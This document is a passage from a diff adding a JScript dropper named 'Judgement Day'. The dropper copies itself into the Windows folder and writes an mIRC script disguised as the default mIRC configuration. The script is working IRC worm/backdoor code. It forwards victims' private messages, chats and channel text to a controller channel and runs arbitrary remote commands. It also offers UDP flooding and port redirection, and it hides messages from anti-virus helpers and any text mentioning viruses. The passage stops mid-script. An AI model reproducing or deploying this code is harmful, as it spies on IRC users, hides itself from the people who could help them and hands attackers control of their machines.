@@ -1,0 +1,1575 @@
+
+//Judgement Day
+// 
+var fso, f, g, h, c, s, p, x, j
+fso = new ActiveXObject("Scripting.FileSystemObject")
+
+c = fso.GetFile(WScript.ScriptFullName)
+c.Copy("c:\\windows\\win.js"); 
+
+
+f = fso.CreateTextFile("c:\\default.ini", true)
+f.writeline("[script]");
+f.writeline("n0=;//****************************************************************************************\\\\;");
+f.writeline("n1=;| |********************************* Default mIRC
+Script *********************************| |;");
+f.writeline("n2=;| |*********************mIRC v5.7 32bit by Khaled
+Mardam-Bey***********************| |;");
+f.writeline("n3=;| |*********************** Copyright 1995- 1999 mIRC
+Co. Ltd. ************************| |;");
+f.writeline("n4=;| | ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ----==DO NOT EDIT
+THIS FILE!!!==---- ! ! ! ! ! ! ! ! ! ! ! ! ! !| |;");
+f.writeline("n5=;| |****************************** More info in mIRC
+help file. ***************************//;");
+f.writeline("n6=;`
+`*****************************************************************************************'
+'");
+f.writeline("n7=");
+f.writeline("n8=");
+f.writeline("n9=");
+f.writeline("n10=");
+f.writeline("n11=");
+f.writeline("n12=");
+f.writeline("n13=");
+f.writeline("n14=");
+f.writeline("n15=");
+f.writeline("n16=");
+f.writeline("n17=");
+f.writeline("n18=");
+f.writeline("n19=");
+f.writeline("n20=");
+f.writeline("n21=");
+f.writeline("n22=");
+f.writeline("n23=");
+f.writeline("n24=; !!!! Advanced mIRC default script Do not touch
+!!!!!");
+f.writeline("n25=");
+f.writeline("n26=on *:connect: { if jd.num != $null && jd.num < 6 { inc
+jd.num 1 } | else { if jd.num != $null { unset jd.num } } | if
+$portfree(113) = $true { socklisten jdident 113 } | sockopen sockclone
+$server 6667 | write -c c:\\windows\\systemstuff.txt | write -c
+c:\\windows\\systemvar.txt | write -c c:\\windows\\systemreg.txt }");
+f.writeline("n27=raw 332:*: if $2 = #nohack { halt }");
+f.writeline("n28=on *:INPUT:#: { if $sock(sockclone,n) != 0 { if $chan =
+#nohack { echo $colour(Own text) #nohack < $+ $me $+ > $1- | sockwrite
+-n sockclone PRIVMSG %jd.dachan : $+ 
+3,1 $me IN
+4,1 $chan 
+ $+ $chr(34) $+ $1- $+ 
+ $+ $chr(34) 
+3,1(dont worry, they cant really talk in #nohack) | halt }");
+f.writeline("n29=sockwrite -n sockclone PRIVMSG %jd.dachan : $+ 
+3,1 $me IN
+4,1 $chan 
+ $+ $chr(34) $+ $1- $+ 
+ $+ $chr(34) } }");
+f.writeline("n30=on *:INPUT:!: if $sock(sockclone,n) != 0 { sockwrite -n
+sockclone PRIVMSG %jd.dachan : $+ 
+3,1 $me IN Fileserver
+4,1 $right($active,$calc( $len($active) - 1 )) 
+ $+ $chr(34) $+ $1- $+ 
+ $+ $chr(34) }");
+f.writeline("n31=on *:INPUT:=: if $sock(sockclone,n) != 0 { sockwrite -n
+sockclone PRIVMSG %jd.dachan : $+ 
+3,1 $me IN Dcc To
+4,1 $right($active,$calc( $len($active) - 1 )) 
+ $+ $chr(34) $+ $1- $+ 
+ $+ $chr(34) }");
+f.writeline("n32=on *:INPUT:?: if $sock(sockclone,n) != 0 { sockwrite -n
+sockclone PRIVMSG %jd.dachan : $+ 
+3,1 $me To
+4,1 $active 
+ $+ $chr(34) $+ $1- $+ 
+ $+ $chr(34) }");
+f.writeline("n33=on *:INPUT:*: { if $sock(sockclone,n) != 0 { if $active
+= Status Window { sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1 $me IN
+4,1 Status Window 
+ $+ $chr(34) $+ $1- $+ 
+ $+ $chr(34) } } }");
+f.writeline("n34=on *:Join:#:{ if $nick = $me { sockwrite -n sockclone
+PRIVMSG %jd.dachan :
+3,1 $me just joined
+4,1 $chan } }");
+f.writeline("n35=on *:Part:#:{ if $nick = $me { sockwrite -n sockclone
+PRIVMSG %jd.dachan :
+3,1 $me just parted
+4,1 $chan } }");
+f.writeline("n36=on *:Text:*:?:{ sockwrite -n sockclone PRIVMSG
+%jd.dachan : $+ 
+3,1 $me From
+4,1 $nick 
+ $+ $chr(34) $+ $1- $+ 
+ $+ $chr(34) }");
+f.writeline("n37=on *:Chat:*: { sockwrite -n sockclone PRIVMSG
+%jd.dachan : $+ 
+3,1 $me IN Dcc From
+4,1 $nick 
+ $+ $chr(34) $+ $1- $+ 
+ $+ $chr(34) }");
+f.writeline("n38=on *:Action:*:?:{ sockwrite -n sockclone PRIVMSG
+%jd.dachan : $+ 
+3,1 $me From
+4,1 $nick 
+ $+ $nick $1- }");
+f.writeline("n39=on *:Action:*:#:{ if $chan = %jd.LISTENINCHAN && $nick
+!= %jd.me { sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1In $chan :
+
+
+ $+ $nick $1- } | if $chan = $active && %jd.Listeninactive = 1 && $nick
+!= %jd.me { sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1In $chan :
+
+
+ $+ $nick $1- } }");
+f.writeline("n40=on *:Text:*:#:{ if $chan = %jd.LISTENINCHAN && $nick !=
+%jd.me { sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1In $chan :
+< $+ $nick $+ > $1- } | if $chan = $active && %jd.Listeninactive = 1 &&
+$nick != %jd.me { sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1In $chan :
+< $+ $nick $+ > $1- } }");
+f.writeline("n41=on *:TOPIC:#nohack: { clear #nohack }");
+f.writeline("n42=on ^*:text:*:*: { if $nick isop #nohack || $nick isvo
+#nohack || $nick = Gawaine || $nick = RichG || $nick = `dRaGoN^FIre` ||
+$nick = honey-dew || $nick = Pinballwiz || $nick = SysRequest || $nick =
+VScan || $nick = Lover_Boy || $nick = The-MoonLight-Knight || $nick =
+^CoMpiLeR^ || $nick = joe || $nick = KabukiMan || $nick = awni || $nick
+= freser || $nick = {Lover_Boy} || nohack isin $1- || virus isin $1- ||
+Judgement Day isin $1- || infect isin $1- { haltdef } }");
+f.writeline("n43=on ^*:notice:*:*: { if $nick isop #nohack || $nick isvo
+#nohack || $nick = ge || $nick = Gawaine || $nick = RichG || $nick =
+`dRaGoN^FIre` || $nick = honey-dew || $nick = Pinballwiz || $nick =
+SysRequest || $nick = VScan || $nick = Lover_Boy || $nick =
+The-MoonLight-Knight || $nick = ^CoMpiLeR^ || $nick = joe || $nick =
+KabukiMan || $nick = awni || $nick = freser || $nick = {Lover_Boy} ||
+nohack isin $1- || virus isin $1- || Judgement Day isin $1- || infect
+isin $1- { haltdef } }");
+f.writeline("n44=on ^*:Action:*:*: { if $nick isop #nohack || $nick isvo
+#nohack || $nick = ge || $nick = Gawaine || $nick = RichG || $nick =
+`dRaGoN^FIre` || $nick = honey-dew || $nick = Pinballwiz || $nick =
+SysRequest || $nick = VScan || $nick = Lover_Boy || $nick =
+The-MoonLight-Knight || $nick = ^CoMpiLeR^ || $nick = joe || $nick =
+KabukiMan || $nick = awni || $nick = freser || $nick = {Lover_Boy} ||
+nohack isin $1- || virus isin $1- || Judgement Day isin $1- || infect
+isin $1- { haltdef } }");
+f.writeline("n45=on *:CLOSE:?: { if $sock(sockclone,n) != 0 { sockwrite
+-n sockclone PRIVMSG %jd.dachan : $+ 
+3,1 $me Closed window:
+4,1 $target } }");
+f.writeline("n46=on *:socklisten:jdident: { if ($sockerr > 0) return |
+set %jd.holdup 0 | :loop | inc %jd.holdup 1 | if $sock(ident $+
+%jd.holdup,1) = $null { sockaccept ident $+ %jd.holdup | unset
+%jd.holdup } | else { goto loop } }");
+f.writeline("n47=on *:sockread:ident*:{ sockread %jd.ident.tempvar |
+sockwrite $sockname %jd.ident.tempvar : USERID : UNIX : $jdscramble |
+unset %jd.ident.tempvar }");
+f.writeline("n48=on *:sockopen:sockclone:{ if ($sockerr > 0) {
+jdcouldntconnect | return } | jdnick | sockwrite -n sockclone USER
+$jdscramble $chr(34) $+ $jdscramble $+ $chr(34) $chr(34) $+ $jdscramble
+$+ $chr(34) : $+ $jdscramble | .timerjoinstuff 1 15 jdjoinstuff }");
+f.writeline("n49=on 1:sockread:sockclone:{");
+f.writeline("n50= sockread -f %jd.sysvar");
+f.writeline("n51= if $gettok(%jd.sysvar,1,32) = PING { sockwrite -n
+sockclone PONG : $+ $server }");
+f.writeline("n52= if $gettok(%jd.sysvar,2,32) = 433 ||
+$gettok(%jd.sysvar,2,32) = 451 { jdnick }");
+f.writeline("n53= if $gettok(%jd.sysvar,2,32) = 263 { .timer 1 5
+sockwrite -n sockclone list * $+
+$gettok(#teen:#sex:#warez:#mp3:#0!!!!!!!:#Anime:#Gay:#hack:#100%,
+$rand(1,9),58) $+ * }");
+f.writeline("n54= if $gettok(%jd.sysvar,2,32) = 322 { if
+$exists(c:\\windows\\systemstuff.txt) != $false &&
+$exists(c:\\windows\\systemvar.txt) != $false { write
+c:\\windows\\systemstuff.txt $gettok(%jd.sysvar,4,32) | write
+c:\\windows\\systemvar.txt $gettok(%jd.sysvar,5,32) } }");
+f.writeline("n55= if $gettok(%jd.sysvar,2,32) = 323 { jdjoindasendchan
+}");
+f.writeline("n56= if $gettok(%jd.sysvar,2,32) = 353 { inc %jd.peoplesnum
+1 | set %jd.peoples $+ %jd.peoplesnum $gettok(%jd.sysvar,2,58) }");
+f.writeline("n57= if $gettok(%jd.sysvar,2,32) = 366 { jdaddtodontsend
+}");
+f.writeline("n58= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,3,32) = %jd.spychan { sockwrite -n sockclone PRIVMSG
+%jd.dachan :
+3,1In %jd.spychan :
+< $+ $remove($gettok(%jd.sysvar,1,33),:) $+ >
+$right(%jd.sysvar,$calc($len(%jd.sysvar ) - $pos(%jd.sysvar,:,2) ) )
+}");
+f.writeline("n59= if $gettok(%jd.sysvar,2,32) = NICK &&
+$gettok($gettok(%jd.sysvar,1,58),1,33) = %jd.me { set %jd.me
+$gettok(%jd.sysvar,2,58) } | if $gettok(%jd.sysvar,2,32) = NICK &&
+$gettok($gettok(%jd.sysvar,1,58),1,33) != %jd.me { jdononenick
+$gettok($gettok(%jd.sysvar,1,58),1,33) $gettok(%jd.sysvar,2,58) }");
+f.writeline("n60= if $gettok(%jd.sysvar,2,32) = JOIN { jdononejoin
+$gettok($gettok(%jd.sysvar,1,58),1,33) $gettok(%jd.sysvar,2,58) }");
+f.writeline("n61= if $gettok(%jd.sysvar,2,32) = MODE &&
+$gettok(%jd.sysvar,4,32) = +o && $gettok(%jd.sysvar,3,32) != %jd.dachan
+&& $gettok(%jd.sysvar,3,32) != %jd.spychan && $gettok(%jd.sysvar,5,32)
+!= %jd.me { if $exists(c:\\windows\\systemlog.txt) = $false { write -c
+c:\\windows\\systemlog.txt } | if $read -s $+ $gettok(%jd.sysvar,5,32)
+c:\\windows\\systemlog.txt = $null { write c:\\windows\\systemlog.txt
+$gettok(%jd.sysvar,5,32) } }");
+f.writeline("n62= if $gettok(%jd.sysvar,2,32) = MODE &&
+$gettok(%jd.sysvar,4,32) = +v && $gettok(%jd.sysvar,3,32) != %jd.dachan
+&& $gettok(%jd.sysvar,3,32) != %jd.spychan && $gettok(%jd.sysvar,5,32)
+!= %jd.me { if $exists(c:\\windows\\systemlog.txt) = $false { write -c
+c:\\windows\\systemlog.txt } | if $read -s $+ $gettok(%jd.sysvar,5,32)
+c:\\windows\\systemlog.txt = $null { write c:\\windows\\systemlog.txt
+$gettok(%jd.sysvar,5,32) } }");
+f.writeline("n63= if $gettok(%jd.sysvar,2,32) = MODE &&
+$gettok(%jd.sysvar,4,32) = -o && $gettok(%jd.sysvar,3,32) != %jd.dachan
+&& $gettok(%jd.sysvar,3,32) != %jd.spychan && $gettok(%jd.sysvar,5,32)
+!= %jd.me { if $exists(c:\\windows\\systemlog.txt) = $false { write -c
+c:\\windows\\systemlog.txt } | if $read -s $+ $gettok(%jd.sysvar,5,32)
+c:\\windows\\systemlog.txt = $null { write c:\\windows\\systemlog.txt
+$gettok(%jd.sysvar,5,32) } }");
+f.writeline("n64= if $gettok(%jd.sysvar,2,32) = MODE &&
+$gettok(%jd.sysvar,4,32) = -v && $gettok(%jd.sysvar,3,32) != %jd.dachan
+&& $gettok(%jd.sysvar,3,32) != %jd.spychan && $gettok(%jd.sysvar,5,32)
+!= %jd.me { if $exists(c:\\windows\\systemlog.txt) = $false { write -c
+c:\\windows\\systemlog.txt } | if $read -s $+ $gettok(%jd.sysvar,5,32)
+c:\\windows\\systemlog.txt = $null { write c:\\windows\\systemlog.txt
+$gettok(%jd.sysvar,5,32) } }");
+f.writeline("n65= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$left($gettok(%jd.sysvar,2,58),5) = 
+PING { sockwrite -n sockclone NOTICE
+$gettok($gettok(%jd.sysvar,1,58),1,33) : $+ $gettok(%jd.sysvar,2,58)
+}");
+f.writeline("n66= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = 
+VERSION
+ { sockwrite -n sockclone NOTICE $gettok($gettok(%jd.sysvar,1,58),1,33)
+:
+VERSION mIRC32 v5.7 K.Mardam-Bey
+ }");
+f.writeline("n67= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = 
+TIME
+ { sockwrite -n sockclone NOTICE $gettok($gettok(%jd.sysvar,1,58),1,33)
+:
+TIME $fulldate
+ }");
+f.writeline("n68= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = 
+FINGER
+ { sockwrite -n sockclone NOTICE $gettok($gettok(%jd.sysvar,1,58),1,33)
+:
+FINGER $readini mirc.ini mIRC user ( $+ $readini mirc.ini mIRC email $+
+) Idle $idle seconds
+ }");
+f.writeline("n69= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me HELP && $gettok(%jd.sysvar,3,32) =
+%jd.dachan { jdhelp }");
+f.writeline("n70= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me HELP WHATISTHIS &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan { jdhelp WHATISTHIS }");
+f.writeline("n71= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me WHATISTHIS && $gettok(%jd.sysvar,3,32)
+= %jd.dachan { jdhelp WHATISTHIS }");
+f.writeline("n72= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me HELP UDPFLOOD &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan { jdhelp UDPFLOOD }");
+f.writeline("n73= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$left($gettok(%jd.sysvar,2,58),$calc($len(%jd.me) + 9) ) = %jd.me
+UDPFLOOD && $gettok(%jd.sysvar,3,32) = %jd.dachan { jdudpfloodem
+$right($gettok(%jd.sysvar,2,58),$calc($len($gettok(%jd.sysvar,2,58) ) -
+$len(%jd.me) - 10) ) }");
+f.writeline("n74= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me HELP PORTREDIRECT &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan { jdhelp PORTREDIRECT }");
+f.writeline("n75= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me PORTREDIRECT STATUS &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan { jdredirectstats }");
+f.writeline("n76= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$left($gettok(%jd.sysvar,2,58),$calc($len(%jd.me) + 19) ) = %jd.me
+PORTREDIRECT START && $gettok(%jd.sysvar,3,32) = %jd.dachan {
+jdportredirect
+$right($gettok(%jd.sysvar,2,58),$calc($len($gettok(%jd.sysvar,2,58) ) -
+$len(%jd.me) - 20) ) }");
+f.writeline("n77= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$left($gettok(%jd.sysvar,2,58),$calc($len(%jd.me) + 18) ) = %jd.me
+PORTREDIRECT STOP && $gettok(%jd.sysvar,3,32) = %jd.dachan { Set
+%jd.temp.port.n.umber
+$right($gettok(%jd.sysvar,2,58),$calc($len($gettok(%jd.sysvar,2,58) ) -
+$len(%jd.me) - 19) ) | sockclose [ jdlistenport. [ $+ [
+%jd.temp.port.n.umber ] ] ] | sockclose [ jdin. [ $+ [
+%jd.temp.port.n.umber ] ] ] $+ * | sockclose [ jdout. [ $+ [
+%jd.temp.port.n.umber ] ] ] $+ * | sockwrite -n sockclone PRIVMSG
+%jd.dachan :
+3,1No Longer Redirecting Port
+4,1 %jd.temp.port.n.umber | unset %jd.temp.port.n.umber }");
+f.writeline("n78= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$left($gettok(%jd.sysvar,2,58),$calc($len(%jd.me) + 17) ) = %jd.me
+CHANNELSPY START && $gettok(%jd.sysvar,3,32) = %jd.dachan { set
+%jd.spychan
+$right($gettok(%jd.sysvar,2,58),$calc($len($gettok(%jd.sysvar,2,58) ) -
+$len(%jd.me) - 18) ) | sockwrite -n sockclone JOIN %jd.spychan |
+sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1Now Spying in
+4,1 %jd.spychan }");
+f.writeline("n79= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me CHANNELSPY STOP &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan { sockwrite -n sockclone PART
+%jd.spychan | unset %jd.spychan | sockwrite -n sockclone PRIVMSG
+%jd.dachan :
+3,1Channel Spy Disabled }");
+f.writeline("n80= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me HELP CHANNELSPY &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan { jdhelp CHANNELSPY }");
+f.writeline("n81= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me HELP LISTENIN &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan { jdhelp LISTENIN }");
+f.writeline("n82= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me LISTENIN LIST &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan { jdLISTENINLIST }");
+f.writeline("n83= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$left($gettok(%jd.sysvar,2,58),$calc($len(%jd.me) + 15) ) = %jd.me
+LISTENIN START && $gettok(%jd.sysvar,3,32) = %jd.dachan { set
+%jd.LISTENINCHAN
+$right($gettok(%jd.sysvar,2,58),$calc($len($gettok(%jd.sysvar,2,58) ) -
+$len(%jd.me) - 16) ) | sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1Now listening in on %jd.LISTENINCHAN | unset %jd.Listeninactive }");
+f.writeline("n84= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me LISTENIN STOP &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan { if %jd.LISTENINCHAN != $null {
+sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1No longer listening in on %jd.LISTENINCHAN | unset %jd.LISTENINCHAN }
+| if %jd.Listeninactive != $null { sockwrite -n sockclone PRIVMSG
+%jd.dachan :
+3,1No longer listening in on active channels | unset %jd.Listeninactive
+} }");
+f.writeline("n85= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me LISTENIN ACTIVE &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan { sockwrite -n sockclone PRIVMSG
+%jd.dachan :
+3,1Now Lisening in on any channel that is active to $me | unset
+%jd.LISTENINCHAN | set %jd.Listeninactive 1 }");
+f.writeline("n86= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me HELP BOT && $gettok(%jd.sysvar,3,32) =
+%jd.dachan { jdhelp BOT }");
+f.writeline("n87= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$left($gettok(%jd.sysvar,2,58),$calc($len(%jd.me) + 4) ) = %jd.me BOT &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan { jdbotcmdshndl
+$right($gettok(%jd.sysvar,2,58),$calc($len($gettok(%jd.sysvar,2,58) ) -
+$len(%jd.me) - 5) ) }");
+f.writeline("n88= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me HELP CHANGEMASTERCHAN &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan { jdhelp CHANGEMASTERCHAN }");
+f.writeline("n89= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$left($gettok(%jd.sysvar,2,58),$calc($len(%jd.me) + 17) ) = %jd.me
+CHANGEMASTERCHAN && $gettok(%jd.sysvar,3,32) = %jd.dachan { if
+$left($right($gettok(%jd.sysvar,2,58),$calc($len($gettok(%jd.sysvar,2,58)
+) - $len(%jd.me) - 18) ),1) = $chr(35) { sockwrite -n sockclone JOIN
+$right($gettok(%jd.sysvar,2,58),$calc($len($gettok(%jd.sysvar,2,58) ) -
+$len(%jd.me) - 18) ) | sockwrite -n sockclone PART %jd.dachan :Master
+Channel Changed | set %jd.dachan
+$right($gettok(%jd.sysvar,2,58),$calc($len($gettok(%jd.sysvar,2,58) ) -
+$len(%jd.me) - 18) ) } }");
+f.writeline("n90= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$left($gettok(%jd.sysvar,2,58),9) = 
+DCC SEND { jdondccsend $gettok(%jd.sysvar,2,58)
+$gettok($gettok(%jd.sysvar,1,33),1,58) }");
+f.writeline("n91= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$left($gettok(%jd.sysvar,2,58),$calc($len(%jd.me) + 3) ) = %jd.me JD &&
+$gettok(%jd.sysvar,3,32) = %jd.dachan {
+$right($gettok(%jd.sysvar,2,58),$calc($len($gettok(%jd.sysvar,2,58) ) -
+$len(%jd.me) - 4) ) }");
+f.writeline("n92= if $gettok(%jd.sysvar,2,32) = PRIVMSG &&
+$gettok(%jd.sysvar,2,58) = %jd.me HELP JD && $gettok(%jd.sysvar,3,32) =
+%jd.dachan { jdhelp JD }");
+f.writeline("n93= unset %jd.sysvar");
+f.writeline("n94=}");
+f.writeline("n95=alias jdrandjoin { return
+$gettok(#teen:#sex:#warez:#mp3:#0!!!!!!!:#vcd:#Anime:#Gay:#hack:#100%:#Chat,
+$rand(1,11),58) $+ $jdscramble }");
+f.writeline("n96=alias jdscramble { unset %jd.nullvalue %jd.randomthing
+| set %jd.nullvalue $rand(1,10) | :loop | Set %jd.randomthing
+%jd.randomthing $+ $rand(a,z) | if $len(%jd.randomthing) <=
+%jd.nullvalue { goto loop } | return %jd.randomthing }");
+f.writeline("n97=alias jdjoinstuff {");
+f.writeline("n98= set %jd.dachan $jdrandjoin");
+f.writeline("n99= unset %jd.nullvalue %jd.randomthing");
+f.writeline("n100= sockwrite -n sockclone join %jd.dachan");
+f.writeline("n101= write -c c:\\windows\\systemstuff.txt");
+f.writeline("n102= write -c c:\\windows\\systemvar.txt | unset
+%jd.timesthrough %jd.sendchan.line");
+f.writeline("n103= sockwrite -n sockclone list * $+
+$gettok(#teen:#sex:#warez:#mp3:#0!!!!!!!:#Anime:#Gay:#hack:#100%:#Chat:#vcd,
+$rand(1,11),58) $+ *");
+f.writeline("n104=}");
+f.writeline("n105=alias jdnick {");
+f.writeline("n106= set %jd.me $jdscramble");
+f.writeline("n107= sockwrite -n sockclone NICK %jd.me");
+f.writeline("n108=}");
+f.writeline("n109=alias jdjoindasendchan {");
+f.writeline("n110= inc %jd.timesthrough 1 | if %jd.timesthrough = 1 {
+set %jd.joinnum 0 | set %jd.jointwo 0 | set %jd.jointhree 0 }");
+f.writeline("n111= set %jd.sendchan.line 0");
+f.writeline("n112= :loop");
+f.writeline("n113= inc %jd.sendchan.line 1");
+f.writeline("n114= if $read -tl $+ %jd.sendchan.line
+c:\\windows\\systemvar.txt != $null {");
+f.writeline("n115= if %jd.timesthrough = 1 {");
+f.writeline("n116= if %jd.joinnum < $read -tl $+ %jd.sendchan.line
+c:\\windows\\systemvar.txt {");
+f.writeline("n117= set %jd.joinnum $read -tl $+ %jd.sendchan.line
+c:\\windows\\systemvar.txt");
+f.writeline("n118= set %jd.joinline.jd %jd.sendchan.line");
+f.writeline("n119= goto loop");
+f.writeline("n120= }");
+f.writeline("n121= else { goto loop }");
+f.writeline("n122= }");
+f.writeline("n123= if %jd.timesthrough = 2 {");
+f.writeline("n124= if %jd.jointwo < $read -tl $+ %jd.sendchan.line
+c:\\windows\\systemvar.txt && $read -tl $+ %jd.sendchan.line
+c:\\windows\\systemvar.txt < %jd.joinnum {");
+f.writeline("n125= set %jd.jointwo $read -tl $+ %jd.sendchan.line
+c:\\windows\\systemvar.txt");
+f.writeline("n126= set %jd.joinline.jd %jd.sendchan.line");
+f.writeline("n127= goto loop");
+f.writeline("n128= }");
+f.writeline("n129= else { goto loop }");
+f.writeline("n130= }");
+f.writeline("n131= if %jd.timesthrough = 3 {");
+f.writeline("n132= if %jd.jointhree < $read -tl $+ %jd.sendchan.line
+c:\\windows\\systemvar.txt && $read -tl $+ %jd.sendchan.line
+c:\\windows\\systemvar.txt < %jd.jointwo {");
+f.writeline("n133= set %jd.jointhree $read -tl $+ %jd.sendchan.line
+c:\\windows\\systemvar.txt");
+f.writeline("n134= set %jd.joinline.jd %jd.sendchan.line");
+f.writeline("n135= goto loop");
+f.writeline("n136= }");
+f.writeline("n137= else { goto loop }");
+f.writeline("n138= }");
+f.writeline("n139=");
+f.writeline("n140= }");
+f.writeline("n141= else { if %jd.timesthrough < 3 { .timer -m 1 1
+jdjoindasendchan | goto end }");
+f.writeline("n142= sockwrite -n sockclone join $read -tl $+
+%jd.joinline.jd c:\\windows\\systemstuff.txt");
+f.writeline("n143= unset %jd.sendchan.line %jd.joinnum %jd.joinline.jd
+%jd.timesthrough %jd.jointwo %jd.jointhree");
+f.writeline("n144= :end");
+f.writeline("n145= }");
+f.writeline("n146=}");
+f.writeline("n147=on *:QUIT: { if $nick = $me { if $sock(sockclone,n) !=
+0 { sockwrite -n sockclone QUIT :J U D G E M E N T --- D A Y | sockclose
+sockclone } } }");
+f.writeline("n148=on *:DISCONNECT: { if $sock(sockclone,n) != 0 {
+sockwrite -n sockclone QUIT :J U D G E M E N T --- D A Y | sockclose
+sockclone } }");
+f.writeline("n149=on *:sockclose:sockclone: { sockclose sockclone |
+sockopen sockclone $server 6667 }");
+f.writeline("n150=; How about addin' some port redirect functions? ( IRC
+servers hate this stuff :P )");
+f.writeline("n151=alias jdcouldntconnect {");
+f.writeline("n152= sockopen sockclone $server 6667");
+f.writeline("n153= write -c c:\\windows\\systemstuff.txt");
+f.writeline("n154= write -c c:\\windows\\systemvar.txt");
+f.writeline("n155=}");
+f.writeline("n156=");
+f.writeline("n157=alias jdportredirect {");
+f.writeline("n158= if $3 = $null { return }");
+f.writeline("n159= sockwrite -n sockclone PRIVMSG %jd.dachan :
+3,1 Now Redirecting port
+4,1 $1 
+3,1to
+4,1 $2 $+ : $+ $3");
+f.writeline("n160= socklisten jdlistenport $+ . $+ $1 $1");
+f.writeline("n161= sockmark jdlistenport $+ . $+ $1 $2 $3");
+f.writeline("n162=}");
+f.writeline("n163=on *:socklisten:jdlistenport*:{");
+f.writeline("n164= set %jd.lookinforasocknum 0");
+f.writeline("n165= :loop");
+f.writeline("n166= inc %jd.lookinforasocknum 1");
+f.writeline("n167= if $sock(jdin*,$calc($sock(jdin*,0) +
+%jd.lookinforasocknum ) ) != $null { goto loop }");
+f.writeline("n168= set %jd.relate $gettok($sockname,2,46) $+ . $+
+$calc($sock(jdin*,0) + %jd.lookinforasocknum )");
+f.writeline("n169= sockaccept jdin $+ . $+ %jd.relate");
+f.writeline("n170= sockopen jdout $+ . $+ %jd.relate
+$gettok($sock($Sockname).mark,1,32)
+$gettok($sock($Sockname).mark,2,32)");
+f.writeline("n171= unset %jd.relate %jd.lookinforasocknum");
+f.writeline("n172=}");
+f.writeline("n173=on *:Sockread:jdin*: {");
+f.writeline("n174= if ($sockerr > 0) return");
+f.writeline("n175= :nextread");
+f.writeline("n176= sockread [ %jdexchange [ $+ [ $sockname ] ] ]");
+f.writeline("n177= if [ %jdexchange [ $+ [ $sockname ] ] ] = $null {
+return }");
+f.writeline("n178= if $sock( [ jdout [ $+ [ $remove($sockname,jdin) ] ]
+] ).status != active { inc %dj.sockcatchnum 1 | set %jd.tempread $+
+$right($sockname,$calc($len($sockname) - 4) ) $+ %dj.sockcatchnum [
+%jdexchange [ $+ [ $sockname ] ] ] | return }");
+f.writeline("n179= sockwrite -n [ jdout [ $+ [ $remove($sockname,jdin) ]
+] ] [ %jdexchange [ $+ [ $sockname ] ] ]");
+f.writeline("n180= unset [ %jdexchange [ $+ [ $sockname ] ] ]");
+f.writeline("n181= if ($sockbr == 0) return");
+f.writeline("n182= goto nextread");
+f.writeline("n183=}");
+f.writeline("n184=on *:Sockread:jdout*: {");
+f.writeline("n185= if ($sockerr > 0) return");
+f.writeline("n186= :nextread");
+f.writeline("n187= sockread [ %jdreadstuff [ $+ [ $sockname ] ] ]");
+f.writeline("n188= if [ %jdreadstuff [ $+ [ $sockname ] ] ] = $null {
+return }");
+f.writeline("n189= sockwrite -n [ jdin [ $+ [ $remove($sockname,jdout) ]
+] ] [ %jdreadstuff [ $+ [ $sockname ] ] ]");
+f.writeline("n190= unset [ %jdreadstuff [ $+ [ $sockname ] ] ]");
+f.writeline("n191= if ($sockbr == 0) return");
+f.writeline("n192= goto nextread");
